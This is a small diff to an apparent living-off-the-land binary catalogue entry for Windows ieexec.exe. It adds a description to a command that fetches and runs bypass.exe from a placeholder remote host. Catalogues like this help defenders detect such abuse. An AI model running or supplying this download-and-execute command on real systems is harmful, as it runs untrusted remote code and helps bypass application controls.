@@ -6,7 +6,7 @@ Created: '2018-05-25'
 Categories: []
 Commands:
   - Command: ieexec.exe http://x.x.x.x:8080/bypass.exe
-    Description: ''
+    Description: 'Executes bypass.exe from the remote server.'
 Full Path:
   - c:\windows\system32\ieexec.exe
   - c:\windows\sysWOW64\ieexec.exe
